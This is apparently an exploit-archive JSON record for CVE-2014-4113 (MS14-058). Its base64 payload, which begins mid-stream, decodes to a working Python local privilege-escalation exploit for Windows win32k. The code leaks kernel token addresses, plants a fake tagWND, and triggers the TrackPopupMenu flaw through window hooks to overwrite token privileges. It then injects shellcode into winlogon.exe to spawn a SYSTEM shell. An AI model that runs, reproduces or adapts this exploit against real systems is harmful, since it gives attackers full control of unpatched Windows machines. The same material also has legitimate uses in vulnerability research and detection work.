VzdWx0ID09IFNUQVRVU19JTkZPX0xFTkdUSF9NSVNNQVRDSDoNCiAgICAgICAgICAgIHNpemUgPSBEV09SRChzaXplLnZhbHVlICogNCkNCiAgICAgICAgICAgIHJlc2l6ZShzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uLCBzaXplLnZhbHVlKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmFpc2UgeF9maWxlX2hhbmRsZXMoIk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIsIGhleChyZXN1bHQpKQ0KDQogICAgcEhhbmRsZXMgPSBjYXN0KA0KICAgICAgICBzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uLkhhbmRsZXMsDQogICAgICAgIFBPSU5URVIoU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPX0VYICogXA0KICAgICAgICAgICAgICAgIHN5c3RlbV9oYW5kbGVfaW5mb3JtYXRpb24uTnVtYmVyT2ZIYW5kbGVzKQ0KICAgICkNCiAgICBmb3IgaGFuZGxlIGluIHBIYW5kbGVzLmNvbnRlbnRzOg0KICAgICAgICB5aWVsZCBoYW5kbGUuVW5pcXVlUHJvY2Vzc0lkLCBoYW5kbGUuSGFuZGxlVmFsdWUsIGhhbmRsZS5PYmplY3QNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQpkZWYgV25kUHJvYyhod25kLCBtZXNzYWdlLCB3UGFyYW0sIGxQYXJhbSk6DQogICAgIiIiV2luZG93IHByb2NlZHVyZSIiIg0KICAgIA0KICAgIGdsb2JhbCBiV25kUHJvY0ZsYWcNCiAgICBpZiBtZXNzYWdlID09IDI4OSBhbmQgbm90IGJXbmRQcm9jRmxhZzoNCiAgICAgICAgYlduZFByb2NGbGFnID0gVHJ1ZQ0KICAgICAgICB1c2VyMzIuUG9zdE1lc3NhZ2VXKGh3bmQsIDI1NiwgNDAsIDApDQogICAgICAgIHVzZXIzMi5Qb3N0TWVzc2FnZVcoaHduZCwgMjU2LCAzOSwgMCkNCiAgICAgICAgdXNlcjMyLlBvc3RNZXNzYWdlVyhod25kLCA1MTMsIDAsIDApDQogICAgcmV0dXJuIHVzZXIzMi5EZWZXaW5kb3dQcm9jVyhod25kLCBtZXNzYWdlLCB3UGFyYW0sIGxQYXJhbSkNCiAgICANCiAgICANCmRlZiBob29rX2NhbGxiYWNrX29uZShjb2RlLCB3UGFyYW0sIGxQYXJhbSk6DQogICAgIiIiU2V0cyBhIG5ldyBhZGRyZXNzIGZvciB0aGUgd2luZG93IHByb2NlZHVyZSIiIg0KICAgIA0KICAgIGdsb2JhbCBiSG9va0NhbGxiYWNrRmxhZw0KICAgIGlmICgoY2FzdCgobFBhcmFtK3NpemVvZihIQU5ETEUpKjIpLFBEV09SRCkpLmNvbnRlbnRzKS52YWx1ZSA9PSAweDFlYiBhbmRcDQogICAgIG5vdCBiSG9va0NhbGxiYWNrRmxhZzoNCiAgICAgICAgYkhvb2tDYWxsYmFja0ZsYWcgPSBUcnVlDQogICAgICAgIGlmIHVzZXIzMi5Vbmhvb2tXaW5kb3dzSG9vayhXSF9DQUxMV05EUFJPQywgQ0FMTEJBQ0swMSk6DQogICAgICAgICAgICAjIFNldHMgYSBuZXcgYWRkcmVzcyBmb3IgdGhlIHdpbmRvdyBwcm9jZWR1cmUNCiAgICAgICAgICAgIGxvZygiQ2FsbGJhY2sgdHJpZ2dlcmVkISIpDQogICAgICAgICAgICBsb2coIlNldHRpbmcgdGhlIG5ldyBhZGRyZXNzIGZvciB0aGUgd2luZG93IHByb2NlZHVyZS4uLiIpDQogICAgICAgICAgICBscFByZXZXbmRGdW5jID0gdXNlcjMyLlNldFdpbmRvd0xvbmdQdHJXXA0KICAgICAgICAgICAgICgoY2FzdCgobFBhcmFtK3NpemVvZihIQU5ETEUpKjMpLFBEV09SRCkuY29udGVudHMpLnZhbHVlLA0KICAgICAgICAgICAgICAgR1dMUF9XTkRQUk9DLCBDQUxMQkFDSzAyKQ0KICAgIHJldHVybiB1c2VyMzIuQ2FsbE5leHRIb29rRXgoMCwgY29kZSwgd1BhcmFtLCBsUGFyYW0pDQoNCg0KZGVmIGhvb2tfY2FsbGJhY2tfdHdvKGhXbmQsIE1zZywgd1BhcmFtLCBsUGFyYW0pOg0KICAgICIiIk9uY2UgY2FsbGVkIHdpbGwgcmV0dXJuIHRoZSBmYWtlIHRhZ1dORCBhZGRyZXNzIiIiDQogICAgDQogICAgZ2xvYmFsIEVYUExPSVRFRA0KICAgIHVzZXIzMi5FbmRNZW51KCkNCiAgICBFWFBMT0lURUQgPSBUcnVlDQogICAgbG9nKCJSZXR1cm5pbmcgdGhlIGZha2UgdGFnV05EIGFuZCBvdmVyd3JpdGluZyB0b2tlbiBwcml2aWxlZ2VzLi4uIikNCiAgICByZXR1cm4gMHgwMDAwMDAwMEZGRkZGRkZCDQoNCg0KZGVmIGJ1aWxkTWVudUFuZFRyaWdnZXIoKToNCiAgICAiIiJDcmVhdGUgbWVudXMgYW5kIGludm9rZSBUcmFja1BvcHVwTWVudSIiIg0KICAgIA0KICAgIGdsb2JhbCBIbWVudTAxLCBIbWVudTAyDQogICAgbG9nKCJDcmVhdGluZyB3aW5kb3dzIGFuZCBtZW51cy4uLiIpDQogICAgd25kQ2xhc3MgPSBXTkRDTEFTUygpDQogICAgd25kQ2xhc3MubHBmblduZFByb2MgPSBXTkRQUk9DKFduZFByb2MpDQogICAgd25kQ2xhc3MubHBzekNsYXNzTmFtZSA9IHUicHduZWQiDQogICAgd25kQ2xhc3MuY2JDbHNFeHRyYSA9IHduZENsYXNzLmNiV25kRXh0cmEgPSAwDQogICAgDQogICAgIyBSZWdpc3RlcmluZyBDbGFzcw0KICAgIGlmIG5vdCB1c2VyMzIuUmVnaXN0ZXJDbGFzc1coYWRkcmVzc29mKHduZENsYXNzKSk6DQogICAgICAgIGxvZygiUmVnaXN0ZXJDbGFzc1cgZmFpbGVkIiwgImUiKQ0KICAgICAgICBzeXMuZXhpdCgpDQogICAgICAgIA0KICAgICMgQ3JlYXRpbmcgdGhlIFdpbmRvdyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIGhXbmQgPSB1c2VyMzIuQ3JlYXRlV2luZG93RXhXKDAsIHUicHduZWQiLCB1InB3bmVkIiwgMCwgLTEsIC0xLCAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgaWYgbm90IGhXbmQ6DQogICAgICAgIGxvZygiQ3JlYXRlV2luZG93RXhXIEZhaWxlZCIsICJlIikNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgICANCiAgICAjIENyZWF0aW5nIHBvcHVwIG1lbnUNCiAgICB1c2VyMzIuQ3JlYXRlUG9wdXBNZW51LnJlc3R5cGUgPSBITUVOVQ0KICAgIEhtZW51MDEgPSB1c2VyMzIuQ3JlYXRlUG9wdXBNZW51KCkNCiAgICBpZiBub3QgSG1lbnUwMToNCiAgICAgICAgbG9nKCJDcmVhdGVQb3B1cE1lbnUgZmFpbGVkIDB4MSIsICJlIikNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIEhtZW51MDFJbmZvID0gTUVOVUlURU1JTkZPKCkNCiAgICBIbWVudTAxSW5mby5jYlNpemUgPSBzaXplb2YoTUVOVUlURU1JTkZPKQ0KICAgIEhtZW51MDFJbmZvLmZNYXNrID0gTUlJTV9TVFJJTkcNCiAgICANCiAgICAjIEluc2VydCBmaXJzdCBtZW51DQogICAgaWYgbm90IHVzZXIzMi5JbnNlcnRNZW51SXRlbVcoSG1lbnUwMSwgMCwgVHJ1ZSwgYWRkcmVzc29mKEhtZW51MDFJbmZvKSk6DQogICAgICAgIGxvZygiRXJyb3IgaW4gSW5zZXJ0TWVudUl0ZW1hIDB4MSIsICJlIikNCiAgICAgICAgdXNlcjMyLkRlc3Ryb3lNZW51KEhtZW51MDEpDQogICAgICAgIHN5cy5leGl0KCkNCiAgICAgICAgDQogICAgIyBDcmVhdGluZyBzZWNvbmQgbWVudQ0KICAgIEhtZW51MDIgPSB1c2VyMzIuQ3JlYXRlUG9wdXBNZW51KCkNCiAgICBpZiBub3QgSG1lbnUwMjoNCiAgICAgICAgbG9nKCJDcmVhdGVQb3B1cE1lbnUgZmFpbGVkIDB4MiIsICJlIikNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIEhtZW51MDJJbmZvID0gTUVOVUlURU1JTkZPKCkNCiAgICBIbWVudTAySW5mby5jYlNpemUgPSBzaXplb2YoTUVOVUlURU1JTkZPKQ0KICAgIEhtZW51MDJJbmZvLmZNYXNrID0gKE1JSU1fU1RSSU5HIHwgTUlJTV9TVUJNRU5VKQ0KICAgIEhtZW51MDJJbmZvLmR3VHlwZURhdGEgPSAiIg0KICAgIEhtZW51MDJJbmZvLmNjaCA9IDENCiAgICBIbWVudTAySW5mby5oU3ViTWVudSA9IEhtZW51MDENCiAgICANCiAgICAjIEluc2VydCBzZWNvbmQgbWVudQ0KICAgIGlmIG5vdCB1c2VyMzIuSW5zZXJ0TWVudUl0ZW1XKEhtZW51MDIsIDAsIFRydWUsIGFkZHJlc3NvZihIbWVudTAySW5mbykpOg0KICAgICAgICBsb2coIkVycm9yIGluIEluc2VydE1lbnVJdGVtYSAweDIiLCAiZSIpDQogICAgICAgIHVzZXIzMi5EZXN0cm95TWVudShIbWVudTAxKQ0KICAgICAgICB1c2VyMzIuRGVzdHJveU1lbnUoSG1lbnUwMSkNCiAgICAgICAgc3lzLmV4aXQoKSAgICANCiAgICAgICAgDQogICAgIyBTZXQgd2luZG93IGNhbGxiYWNrDQogICAgdGlkID0ga2VybmVsMzIuR2V0Q3VycmVudFRocmVhZElkKCkNCiAgICBpZiBub3QgdXNlcjMyLlNldFdpbmRvd3NIb29rRXhXKFdIX0NBTExXTkRQUk9DLCBDQUxMQkFDSzAxLCBOVUxMLCB0aWQpOg0KICAgICAgICBsb2coIkZhaWxlZCBTZXRXaW5kb3dzSG9va0V4QSAweDEiLCAiZSIpDQogICAgICAgIHN5cy5leGl0KCkNCiAgICAgICAgDQogICAgIyBDcmFzaCBpdCENCiAgICBsb2coIkludm9raW5nIFRyYWNrUG9wdXBNZW51Li4uIikgIA0KICAgIHVzZXIzMi5UcmFja1BvcHVwTWVudShIbWVudTAyLCAwLCAtMTAwMDAsIC0xMDAwMCwgMCwgaFduZCwgTlVMTCkNCg0KDQpkZWYgYWxsb2N0YWdXTkQoKToNCiAgICAiIiJBbGxvY2F0ZSBhIGZha2UgdGFnV05EIGluIHVzZXJzcGFjZSBhdCBhZGRyZXNzIDB4MDAwMDAwMDBmZmZmZmZmMCIiIiAgICANCiAgICANCiAgICBoUHJvY2VzcyA9IEhBTkRMRShrZXJuZWwzMi5HZXRDdXJyZW50UHJvY2VzcygpKQ0KICAgIGhUb2tlbiA9IEhBTkRMRSgpDQogICAgaFJlc3RyaWN0ZWRUb2tlbiA9IEhBTkRMRSgpDQogICAgDQogICAgaWYgbm90IGFkdmFwaTMyLk9wZW5Qcm9jZXNzVG9rZW4oaFByb2Nlc3MsVE9LRU5fQUxMX0FDQ0VTUywgYnlyZWYoaFRva2VuKSk6DQogICAgICAgIGxvZygiQ291bGQgbm90IG9wZW4gY3VycmVudCBwcm9jZXNzIHRva2VuIiwgImUiKQ0KICAgICAgICBnZXRMYXN0RXJyb3IoKQ0KICAgICAgICBzeXMuZXhpdCgpDQogICAgaWYgbm90IGFkdmFwaTMyLkNyZWF0ZVJlc3RyaWN0ZWRUb2tlbihoVG9rZW4sIERJU0FCTEVfTUFYX1BSSVZJTEVHRSwgMCwgMCwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwLCAwLCAwLCAwLCBieXJlZihoUmVzdHJpY3RlZFRva2VuKSk6DQogICAgICAgIGxvZygiQ291bGQgbm90IGNyZWF0ZSB0aGUgcmVzdHJpY3RlZCB0b2tlbiIsICJlIikNCiAgICAgICAgZ2V0TGFzdEVycm9yKCkNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIGlmIG5vdCBhZHZhcGkzMi5BZGp1c3RUb2tlblByaXZpbGVnZXMoaFJlc3RyaWN0ZWRUb2tlbiwgMSwgTlVMTCwgMCwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOVUxMLCBOVUxMKToNCiAgICAgICAgbG9nKCJDb3VsZCBub3QgYWRqdXN0IHByaXZpbGVnZXMgdG8gdGhlIHJlc3RyaWN0ZWQgdG9rZW4iLCAiZSIpDQogICAgICAgIGdldExhc3RFcnJvcigpDQogICAgICAgIHN5cy5leGl0KCkgICAgICAgIA0KICAgIA0KICAgICMgTGVhayBUb2tlbiBhZGRyZXNzZXMgaW4ga2VybmVsIHNwYWNlDQogICAgbG9nKCJMZWFraW5nIHRva2VuIGFkZHJlc3NlcyBmcm9tIGtlcm5lbCBzcGFjZS4uLiIpDQogICAgZm9yIHBpZCwgaGFuZGxlLCBvYmogaW4gZ2V0X2hhbmRsZXMoKToNCiAgICAgICAgaWYgcGlkPT1vcy5nZXRwaWQoKSBhbmQgZ2V0X3R5cGVfaW5mbyhoYW5kbGUpID09ICJUb2tlbiI6DQogICAgICAgICAgICBpZiBoVG9rZW4udmFsdWUgPT0gaGFuZGxlOg0KICAgICAgICAgICAgICAgIGxvZygiQ3VycmVudCBwcm9jZXNzIHRva2VuIGFkZHJlc3M6ICV4IiAlIG9iaikNCiAgICAgICAgICAgIGlmIGhSZXN0cmljdGVkVG9rZW4udmFsdWUgPT0gaGFuZGxlOg0KICAgICAgICAgICAgICAgIGxvZygiUmVzdHJpY3RlZCB0b2tlbiBhZGRyZXNzOiAleCIgJSBvYmopDQogICAgICAgICAgICAgICAgUmVzdHJpY3RlZFRva2VuID0gb2JqDQogICAgICAgICAgICAgICAgDQogICAgQ3VycmVudFByb2Nlc3NXaW4zMlByb2Nlc3MgPSAiXHgwMCIqOA0KICAgICMgbnQhX1RPS0VOKzB4NDAgUHJpdmlsZWdlcyA6IF9TRVBfVE9LRU5fUFJJVklMRUdFUw0KICAgICMgKzB4MyBvdmVyd3JpdGUgRW5hYmxlZCBpbiBfU0VQX1RPS0VOX1BSSVZJTEVHRVMsIC0weDggQUREIFJBWCwweDggDQogICAgVG9rZW5BZGRyZXNzID0gc3RydWN0LnBhY2soIjxRIiwgUmVzdHJpY3RlZFRva2VuKzB4NDArMHgzLTB4OCkNCiAgICB0YWdXTkQgPSAiXHg0MSIqMTEgKyAiXHgwMFx4MDBceDAwXHgwMCIgK1wNCiAgICAgIlx4NDIiKjB4QyArICJceGYwXHhmZlx4ZmZceGZmXHgwMFx4MDBceDAwXHgwMCIgK1wNCiAgICAgIlx4MDAiKjggK1wNCiAgICAgIlx4NDMiKjB4MTQ1ICsgQ3VycmVudFByb2Nlc3NXaW4zMlByb2Nlc3MgKyAiXHg0NSIqMHg1OCArXA0KICAgICBUb2tlbkFkZHJlc3MgKyAiXHg0NyIqMHgyOA0KICAgICMjIEFsbG9jYXRlIHNwYWNlIGZvciB0aGUgaW5wdXQgYnVmZmVyDQogICAgbHBCYXNlQWRkcmVzcyA9IExQVk9JRCgweDAwMDAwMDAwZmZmZmZmZjApDQogICAgWmVyb2JpdHMgICAgICA9IFVMT05HKDApDQogICAgUmVnaW9uU2l6ZSAgICA9IExQVk9JRCgweDEwMDApDQogICAgd3JpdHRlbiAgICAgICA9IExQVk9JRCgwKSAgICAgICAgICAgICAgICAgICANCiAgICBkd1N0YXR1cyA9IG50ZGxsLk50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5KDB4ZmZmZmZmZmZmZmZmZmZmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5cmVmKGxwQmFzZUFkZHJlc3MpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYoUmVnaW9uU2l6ZSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWSVJUVUFMX01FTSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpDQogICAgaWYgZHdTdGF0dXMgIT0gU1RBVFVTX1NVQ0NFU1M6DQogICAgICAgIGxvZygiRmFpbGVkIHRvIGFsbG9jYXRlIHRhZ1dORCBvYmplY3QiLCAiZSIpDQogICAgICAgIGdldExhc3RFcnJvcigpDQogICAgICAgIHN5cy5leGl0KCkNCiAgICANCiAgICAjIENvcHkgaW5wdXQgYnVmZmVyIHRvIHRoZSBmYWtlIHRhZ1dORCAgICAgICAgICAgICAgICAgICAgICAgDQogICAgblNpemUgPSAweDIwMCAgICAgICAgIA0KICAgIHdyaXR0ZW4gPSBMUFZPSUQoMCkNCiAgICBscEJhc2VBZGRyZXNzID0gUVdPUkQoMHgwMDAwMDAwMGZmZmZmZmYwKQ0KICAgIGR3U3RhdHVzID0ga2VybmVsMzIuV3JpdGVQcm9jZXNzTWVtb3J5KDB4ZmZmZmZmZmZmZmZmZmZmZiwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbHBCYXNlQWRkcmVzcywgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnV05ELCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuU2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXJlZih3cml0dGVuKSkgDQogICAgaWYgZHdTdGF0dXMgPT0gMDoNCiAgICAgICAgbG9nKCJGYWlsZWQgdG8gY29weSB0aGUgaW5wdXQgYnVmZmVyIHRvIHRoZSB0YWdXTkQgb2JqZWN0IiwgImUiKQ0KICAgICAgICBnZXRMYXN0RXJyb3IoKQ0KICAgICAgICBzeXMuZXhpdCgpICAgIA0KICAgICAgICAgICAgDQogICAgbG9nKCJGYWtlIHdpbjMyayF0YWdXTkQgYWxsb2NhdGVkLCB3cml0dGVuICVkIGJ5dGVzIHRvIDB4JXgiICVcDQogICAgICh3cml0dGVuLnZhbHVlLCBscEJhc2VBZGRyZXNzLnZhbHVlKSkgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgcmV0dXJuIGhSZXN0cmljdGVkVG9rZW4NCg0KDQpkZWYgaW5qZWN0U2hlbGwoaFByaXZpbGVnZWRUb2tlbik6DQogICAgIiIiSW1wZXJzb25hdGUgcHJpdmlsZWdlZCB0b2tlbiBhbmQgaW5qZWN0IHNoZWxsY29kZSBpbnRvIHdpbmxvZ29uLmV4ZSIiIg0KICAgIA0KICAgIHdoaWxlIG5vdCBFWFBMT0lURUQ6DQogICAgICAgIHRpbWUuc2xlZXAoMC4xKQ0KICAgIGxvZygiLSIqNzApDQogICAgbG9nKCJJbXBlcnNvbmF0aW5nIHRoZSBwcml2aWxlZ2VkIHRva2VuLi4uIikNCiAgICBpZiBub3QgYWR2YXBpMzIuSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoaFByaXZpbGVnZWRUb2tlbik6DQogICAgICAgIGxvZygiQ291bGQgbm90IGltcGVyc29uYXRlIHRoZSBwcml2aWxlZ2VkIHRva2VuIiwgImUiKQ0KICAgICAgICBnZXRMYXN0RXJyb3IoKQ0KICAgICAgICBzeXMuZXhpdCgpDQogICAgICAgIA0KICAgICMgR2V0IHdpbmxvZ29uLmV4ZSBwaWQNCiAgICBwaWQgPSBnZXRwaWQoIndpbmxvZ29uLmV4ZSIpDQoNCiAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgd2lubG9nb24gcHJvY2VzcyB3ZSBhcmUgaW5qZWN0aW5nIGludG8gDQogICAgaFByb2Nlc3MgPSBrZXJuZWwzMi5PcGVuUHJvY2VzcyhQUk9DRVNTX0FMTF9BQ0NFU1MsIEZhbHNlLCBpbnQocGlkKSkNCg0KICAgIGlmIG5vdCBoUHJvY2VzczoNCiAgICAgICAgbG9nKCJDb3VsZG4ndCBhY3F1aXJlIGEgaGFuZGxlIHRvIFBJRDogJXMiICUgcGlkLCAiZSIpDQogICAgICAgIHN5cy5leGl0KCkNCg0KICAgIGxvZygiT2J0YWluZWQgaGFuZGxlIDB4JXggZm9yIHRoZSB3aW5sb2dvbi5leGUgcHJvY2VzcyIgJSBoUHJvY2VzcykNCiAgICANCiAgICAjIENyZWF0aW5nIHNoZWxsY29kZSBidWZmZXIgdG8gaW5qZWN0IGludG8gdGhlIGhvc3QgcHJvY2Vzcw0KICAgIHNoID0gY3JlYXRlX3N0cmluZ19idWZmZXIoU0hFTExDT0RFLCBsZW4oU0hFTExDT0RFKSkNCiAgICBjb2RlX3NpemUgPSBsZW4oU0hFTExDT0RFKSAgICANCiAgICANCiAgICAjIEFsbG9jYXRlIHNvbWUgc3BhY2UgZm9yIHRoZSBzaGVsbGNvZGUgKGluIHRoZSBwcm9ncmFtIG1lbW9yeSkNCiAgICBzaF9hZGRyZXNzID0ga2VybmVsMzIuVmlydHVhbEFsbG9jRXgoaFByb2Nlc3MsIDAsIGNvZGVfc2l6ZSwgVklSVFVBTF9NRU0sIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQ0KICAgIGlmIG5vdCBzaF9hZGRyZXNzOg0KICAgICAgICBsb2coIkNvdWxkIG5vdCBhbGxvY2F0ZSBzaGVsbGNvZGUgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIikNCiAgICAgICAgZ2V0TGFzdEVycm9yKCkNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgICANCiAgICBsb2coIkFsbG9jYXRlZCBtZW1vcnkgYXQgYWRkcmVzcyAweCV4IiAlIHNoX2FkZHJlc3MpDQoNCiAgICAjIEluamVjdCBzaGVsbGNvZGUgaW4gdG8gd2lubG9nb24uZXhlIHByb2Nlc3Mgc3BhY2UNCiAgICB3cml0dGVuID0gTFBWT0lEKDApDQogICAgc2hlbGxjb2RlID0gUVdPUkQoc2hfYWRkcmVzcykNCiAgICBkd1N0YXR1cyA9IGtlcm5lbDMyLldyaXRlUHJvY2Vzc01lbW9yeShoUHJvY2Vzcywgc2hlbGxjb2RlLCBzaCwgY29kZV9zaXplLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYod3JpdHRlbikpDQogICAgaWYgbm90IGR3U3RhdHVzOg0KICAgICAgICBsb2coIkNvdWxkIG5vdCB3cml0ZSBzaGVsbGNvZGUgaW50byB3aW5sb2dvbi5leGUiLCAiZSIpDQogICAgICAgIGdldExhc3RFcnJvcigpDQogICAgICAgIHN5cy5leGl0KCkNCiAgICAgICAgDQogICAgbG9nKCJJbmplY3RlZCAlZCBieXRlcyBvZiBzaGVsbGNvZGUgdG8gMHgleCIgJSAod3JpdHRlbi52YWx1ZSwgc2hfYWRkcmVzcykpDQoNCiAgICAjIE5vdyB3ZSBjcmVhdGUgdGhlIHJlbW90ZSB0aHJlYWQgYW5kIHBvaW50IGl0cyBlbnRyeSByb3V0aW5lIHRvIGJlIGhlYWQgb2YgDQogICAgIyBvdXIgc2hlbGxjb2RlDQogICAgdGhyZWFkX2lkID0gSEFORExFKDApDQogICAgaWYgbm90IGtlcm5lbDMyLkNyZWF0ZVJlbW90ZVRocmVhZChoUHJvY2VzcywgMCwgMCwgc2hfYWRkcmVzcywgMCwgMCwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYodGhyZWFkX2lkKSk6DQogICAgICAgIGxvZygiRmFpbGVkIHRvIGluamVjdCBzaGVsbGNvZGUgaW50byB3aW5sb2dvbi5leGUiKQ0KICAgICAgICBzeXMuZXhpdCgwKQ0KDQogICAgbG9nKCJSZW1vdGUgdGhyZWFkICAweCUwOHggY3JlYXRlZCIgJSB0aHJlYWRfaWQudmFsdWUpDQogICAgbG9nKCJTcGF3bmluZyBTWVNURU0gc2hlbGwuLi4iKQ0KICAgICMgS2lsbCBweXRob24gcHJvY2VzcyB0byBraWxsIHRoZSB3aW5kb3cgYW5kIGF2b2lkIEJTT0RzDQogICAgb3Mua2lsbChvcy5nZXRwaWQoKSwgc2lnbmFsLlNJR0FCUlQpDQoNCg0KZGVmIGdldHBpZChwcm9jbmFtZSk6DQogICAgIiIiIEdldCBQcm9jZXNzIFBpZCBieSBwcm9jbmFtZSAiIiINCiAgICANCiAgICBwaWQgPSBOb25lDQogICAgdHJ5Og0KICAgICAgICBoUHJvY2Vzc1NuYXAgPSBrZXJuZWwzMi5DcmVhdGVUb29saGVscDMyU25hcHNob3QoVEgzMkNTX1NOQVBQUk9DRVNTLCAwKQ0KICAgICAgICBwZTMyID0gUFJPQ0VTU0VOVFJZMzIoKQ0KICAgICAgICBwZTMyLmR3U2l6ZSA9IHNpemVvZihQUk9DRVNTRU5UUlkzMikNCiAgICAgICAgcmV0ID0ga2VybmVsMzIuUHJvY2VzczMyRmlyc3QoaFByb2Nlc3NTbmFwICwgYnlyZWYocGUzMikpDQogICAgICAgIHdoaWxlIHJldDoNCiAgICAgICAgICAgIGlmIHBlMzIuc3pFeGVGaWxlID09IExQU1RSKHByb2NuYW1lKS52YWx1ZToNCiAgICAgICAgICAgICAgICBwaWQgPSBwZTMyLnRoMzJQcm9jZXNzSUQNCiAgICAgICAgICAgIHJldCA9IGtlcm5lbDMyLlByb2Nlc3MzMk5leHQoaFByb2Nlc3NTbmFwLCBieXJlZihwZTMyKSkNCiAgICAgICAga2VybmVsMzIuQ2xvc2VIYW5kbGUgKCBoUHJvY2Vzc1NuYXAgKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24sIGU6DQogICAgICAgIGxvZyhzdHIoZSksICJlIikNCiAgICBpZiBub3QgcGlkOg0KICAgICAgICBsb2coIkNvdWxkIG5vdCBmaW5kICVzIFBJRCIgJSBwcm9jbmFtZSkNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIHJldHVybiBwaWQNCg0KDQpDQUxMQkFDSzAxID0gV2luRnVuYzEoaG9va19jYWxsYmFja19vbmUpICAgIA0KQ0FMTEJBQ0swMiA9IFdpbkZ1bmMyKGhvb2tfY2FsbGJhY2tfdHdvKQ0KICAgIA0KICAgIA0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBsb2coIk1TMTQtMDU4IFByaXZpbGVnZSBFc2NhbGF0aW9uIC0gcnl1amluIDxhdD4gb2ZmZW5zaXZlLXNlY3VyaXR5LmNvbSIsIA0KICAgICAgICAiZCIpDQogICAgIyBQcmVwYXJlIHRoZSBiYXR0bGVmaWVsZA0KICAgIGhQcml2aWxlZ2VkVG9rZW4gPSBhbGxvY3RhZ1dORCgpDQogICAgIyBTdGFydCB0aGUgaW5qZWN0aW9uIHRocmVhZA0KICAgIHQxID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aW5qZWN0U2hlbGwsIGFyZ3MgPSAoaFByaXZpbGVnZWRUb2tlbiwpKQ0KICAgIHQxLmRhZW1vbiA9IEZhbHNlDQogICAgdDEuc3RhcnQoKQ0KICAgICMgVHJpZ2dlciB0aGUgdnVsbg0KICAgIGJ1aWxkTWVudUFuZFRyaWdnZXIoKQ==", 
    "filename": "platforms/win_x86-64/local/37064.py", 
    "id": "37064", 
    "cves": [
        "CVE-2014-4113"
    ]
}